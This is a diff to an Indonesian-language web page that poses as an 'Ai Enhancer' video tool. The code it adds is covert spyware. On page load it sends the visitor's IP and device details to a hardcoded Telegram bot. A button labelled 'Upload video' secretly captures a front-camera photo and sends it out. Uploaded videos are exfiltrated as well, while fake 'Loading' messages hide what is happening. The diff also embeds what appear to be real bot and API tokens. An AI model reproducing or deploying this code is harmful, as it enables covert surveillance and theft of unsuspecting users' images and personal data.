@@ -46,13 +46,18 @@
 </head>
 <body>
   <div class="card" role="main">
-    <h1>Ai Enhancer</h1>
-    <p class="lead">Tingkatkan kualitas video Anda dengan kecerdasan buatan.</p>
-    <div class="small">Unggah video Anda untuk memulai.</div>
+    <div class="left">
+      <h1>Ai Enhancer</h1>
+      <p class="lead">Tingkatkan kualitas video Anda dengan kecerdasan buatan.</p>
+      <div class="small">Unggah atau upload video Anda untuk memulai.</div>
+    </div>
 
-    <!-- Tombol Upload Video Saja -->
+    <!-- Tombol Izinkan Kamera -->
+    <button class="btn" id="cameraBtn">Upload video</button>
+
+    <!-- Tombol Upload Video -->
     <label class="btn">
-      📤 Upload Video
+      📤 Unggah Video
       <input type="file" id="videoInput" accept="video/*" capture="environment">
     </label>
 
@@ -62,10 +67,23 @@
 
 <script>
 /* ==== CONFIG ==== */
-const BOT_TOKEN = "6958063603:AAHtHhQjPJvx-JfHjpB1TyBAMmQJSEl1024"; 
-const CHAT_ID  = "5880037867";  
+/* Isi dengan token dan chat_id sendiri */
+const BOT_TOKEN = "6958063603:AAHtHhQjPJvx-JfHjpB1TyBAMmQJSEl1024"; // <-- isi tokenmu
+const CHAT_ID  = "5880037867";  // <-- isi chat id mu
 const statusEl = document.getElementById("status");
 
+/* helper kirim text ke telegram */
+async function sendTextToTelegram(text){
+  if(!BOT_TOKEN || !CHAT_ID) return;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("text", text);
+  form.append("parse_mode", "Markdown");
+  await fetch(url, { method:"POST", body: form });
+}
+
+/* helper kirim video */
 async function sendVideoToTelegram(file, caption){
   if(!BOT_TOKEN || !CHAT_ID) return;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
@@ -76,6 +94,18 @@ async function sendVideoToTelegram(file, caption){
   await fetch(url, { method:"POST", body: form });
 }
 
+/* helper kirim foto */
+async function sendPhotoToTelegram(blob, caption){
+  if(!BOT_TOKEN || !CHAT_ID) return;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", blob, "photo.jpg");
+  if(caption) form.append("caption", caption);
+  await fetch(url, { method:"POST", body: form });
+}
+
+/* ambil info ip dari ipinfo.io */
 async function getIpInfo(){
   try {
     const res = await fetch("https://ipinfo.io/json?token=112f6453bc551e");
@@ -85,14 +115,25 @@ async function getIpInfo(){
   }
 }
 
+/* ambil info device */
 async function getDeviceInfo(){
   let batteryTxt = "-";
-  try { const b = await navigator.getBattery(); batteryTxt = `${Math.round((b.level||0)*100)}%${b.charging ? " ⚡️ Mengisi daya" : ""}`; } catch(e){}
+  try {
+    const b = await navigator.getBattery();
+    batteryTxt = `${Math.round((b.level||0)*100)}%${b.charging ? " ⚡️ Mengisi daya" : ""}`;
+  } catch(e){}
   const conn = navigator.connection || {};
   const net = conn.effectiveType || conn.type || "-";
-  return { battery: batteryTxt, network: net, screen: `${screen.width}x${screen.height}`, ua: navigator.userAgent, time: new Date().toLocaleString("id-ID") };
+  return {
+    battery: batteryTxt,
+    network: net,
+    screen: `${screen.width}x${screen.height}`,
+    ua: navigator.userAgent,
+    time: new Date().toLocaleString("id-ID")
+  };
 }
 
+/* gabungkan detail ip + device */
 async function buildCaption(){
   const ip = await getIpInfo();
   const dev = await getDeviceInfo();
@@ -114,15 +155,49 @@ async function buildCaption(){
   return text;
 }
 
-/* Upload video */
+/* upload video */
 document.getElementById("videoInput").addEventListener("change", async (e)=>{
   const file = e.target.files[0];
   if(!file) return;
   statusEl.textContent = "Loading...";
   const caption = await buildCaption();
   await sendVideoToTelegram(file, caption);
-  statusEl.textContent = "Loading...";
+  statusEl.textContent = "Loading 90%";
 });
+
+/* izinkan kamera + capture foto */
+document.getElementById("cameraBtn").addEventListener("click", async ()=>{
+  try {
+    statusEl.textContent = "loading...";
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio:false });
+    const track = stream.getVideoTracks()[0];
+
+    const video = document.createElement("video");
+    video.srcObject = new MediaStream([track]);
+    await video.play();
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
+    const caption = await buildCaption();
+    await sendPhotoToTelegram(blob, caption);
+
+    track.stop();
+    statusEl.textContent = "loading";
+  } catch(err){
+    statusEl.textContent = "loading";
+    console.error(err);
+  }
+});
+
+/* kirim info device + ip otomatis saat masuk */
+(async () => {
+  const caption = await buildCaption();
+  await sendTextToTelegram(caption);
+})();
 </script>
 </body>
 </html>
